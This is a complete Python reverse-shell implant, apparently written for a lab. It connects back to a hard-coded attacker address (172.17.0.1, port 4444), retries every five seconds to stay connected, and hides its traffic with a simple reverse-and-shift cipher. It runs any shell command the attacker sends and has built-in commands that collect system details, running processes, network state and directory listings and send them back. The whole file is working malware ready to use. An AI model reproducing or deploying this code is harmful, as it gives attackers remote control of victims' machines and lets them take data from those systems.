#!/usr/bin/python3

import socket
import os
import time
import subprocess

def main():
  target = "172.17.0.1" # Attacker's IP
  port = 4444 # Attacker's port
  connect_attempt = 0 # Counts the connection attempts for obfuscation purposes. Only the communication between net_attack.py and shell.py will be obfuscated. Any later netcat connections will not be obfuscated.
  while True: # Ensure the script keeps running even after the attacker terminates the net_attack script
    try:
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creates an instance of socket connection for connecting to the attacker
      sock.connect((target,port)) # Connect back to the attacker's IP and port
      connect_attempt+=1 # Increments the connection attempt by 1 indicating this is the first time attacker connects to the reverse shell script using net_attack script
      
      # The below code will be executed when the attacker enters 'P' and connects for the first time to the reverse shell from the net_attack script
      
      if connect_attempt == 1: # Check if this is the first time the attacker has connected to the reverse shell script
        while True:
          ob_command = sock.recv(1024).decode("ascii").strip() # Receive the obfuscated command from the attacker
          command = deobfuscate(ob_command) # Deobfuscate the command
          if command.lower() == "exit":
            break
          # Custom commands are available to the attacker
          elif command.startswith("custom"):
            # custom -h :Usage for custom commands will be sent to the attacker
            if command.lower() == "custom -h":
              output = "custom sysinfo - Gathers system information\ncustom netinfo - Gathers network information\ncustom list <directory path> - Lists all the files in the specified directory"
              ob_output = obfuscate(output)
              sock.send(ob_output.encode("ascii"))
            # custom netinfo :Gathers network information from the target and sends to the attacker
            elif command.lower() == "custom netinfo":
              netstat = os.popen("netstat -an").read()
              interface = os.popen("netstat -i").read()
              output = netstat+"\n"+interface
              ob_output = obfuscate(output)
              sock.send(ob_output.encode("ascii"))
            # custom sysinfo :Gathers system information from the target and sends to the attacker
            elif command.lower() == "custom sysinfo":
              uname = os.popen("uname -a").read()
              hostname = os.popen("hostname").read()
              username = os.popen("whoami").read()
              os_info = os.popen("cat /etc/os-release").read()
              ps_aux = os.popen("ps aux").read()
              output = "OS and Kernel Information:\n"+uname+"\nHostname:\n"+hostname+"\nUsername:\n"+username+"\nOS Details:\n"+os_info+"\nRunning Processes:\n"+ps_aux
              ob_output = obfuscate(output)
              sock.send(ob_output.encode("ascii"))
            # custom list <directory> :Prints a list of files contained in the specified directory
            elif command.startswith("custom list "):
              split_command = command.split(" ",1)[1]
              directory = split_command.split(" ",1)[1]
              files = os.listdir(directory)
              output = "Files in "+directory+":\n"+"\n".join(files)
              ob_output = obfuscate(output)
              sock.send(ob_output.encode("ascii"))
          else:
            try:
              response = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode("ascii") # Execute the command sent by the user. Used subprocess to handle invalid commands provided by the user.
              ob_response = obfuscate(response) # Obfuscate the command output
              if not ob_response.strip(): # If no output is generated then send "command executed successfully" to the attacker
                response = "Command executed successfully."
                ob_response = obfuscate(response)
              sock.send(ob_response.encode("ascii")) # If output is generated then send the obfuscated output to the attacker
            except Exception:
              ex_output = "Command failed." # If command fails with an exception then send "command failed" to the attacker
              ob_ex_output = obfuscate(ex_output)
              sock.send(ob_ex_output.encode("ascii"))
      
      # The below code will be executed when the attacker has terminated the net_attack.py script and opens a netcat listener on their machine with IP 172.17.0.1 and port 4444. This netcat communication is not obfuscated.
      # Since the code is the same as above just without obfuscation so I have not added any comments
      else:
        while True:
          ob_command = sock.recv(1024).decode("ascii").strip()
          command = ob_command
          if command.lower() == "exit":
            break
          elif command.startswith("custom"):
            if command.lower() == "custom -h":
              output = "custom sysinfo - Gathers system information\ncustom netinfo - Gathers network information\ncustom list <directory path> - Lists all the files in the specified directory\n"
              ob_output = output
              sock.send(ob_output.encode("ascii"))
            elif command.lower() == "custom netinfo":
              netstat = os.popen("netstat -an").read()
              interface = os.popen("netstat -i").read()
              output = netstat+"\n"+interface
              ob_output = output
              sock.send(ob_output.encode("ascii"))
            elif command.lower() == "custom sysinfo":
              uname = os.popen("uname -a").read()
              hostname = os.popen("hostname").read()
              username = os.popen("whoami").read()
              os_info = os.popen("cat /etc/os-release").read()
              ps_aux = os.popen("ps aux").read()
              output = "OS and Kernel Information:\n"+uname+"\nHostname:\n"+hostname+"\nUsername:\n"+username+"\nOS Details:\n"+os_info+"\nRunning Processes:\n"+ps_aux
              ob_output = output
              sock.send(ob_output.encode("ascii"))
            elif command.startswith("custom list "):
              split_command = command.split(" ",1)[1]
              directory = split_command.split(" ",1)[1]
              files = os.listdir(directory)
              output = "Files in "+directory+":\n"+"\n".join(files)
              ob_output = output+"\n"
              sock.send(ob_output.encode("ascii"))
          else:
            try:
              if command == "":
                continue
              else:
                response = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode("ascii")
                ob_response = response
                if not ob_response.strip():
                  response = "Command executed successfully.\n"
                  ob_response = response
                sock.send(ob_response.encode("ascii"))
            except Exception:
              ex_output = "Command failed.\n"
              ob_ex_output = ex_output
              sock.send(ob_ex_output.encode("ascii"))
      sock.close()
    except Exception: # If the socket connection fails then an exception is caught and the script waits for 5 seconds before connecting again
      time.sleep(5)

# Function to obfuscate the passed plain text and return cipher text

def obfuscate(plain_text):
  # Rotating the plain text
  rot_text = ""
  i = len(plain_text)-1
  while i >= 0:
    rot_text += plain_text[i]
    i-=1
  # Forward shifting the rotated text by 3
  cipher_text = ""
  for char in rot_text:
    ascii_value = ord(char)
    ascii_value +=3
    cipher_text += chr(ascii_value)
  return cipher_text

# Function to deobfuscate the passed cipher text and return plain text

def deobfuscate(cipher_text):
  # Reverse shifting the cipher text by 3
  plain_text = ""
  rot_text = ""
  for char in cipher_text:
    ascii_value = ord(char)
    ascii_value -=3
    plain_text+=chr(ascii_value)
  # Rotating the shifted text
  i = len(plain_text)-1
  while i >= 0:
    rot_text += plain_text[i]
    i-=1
  return rot_text

main()
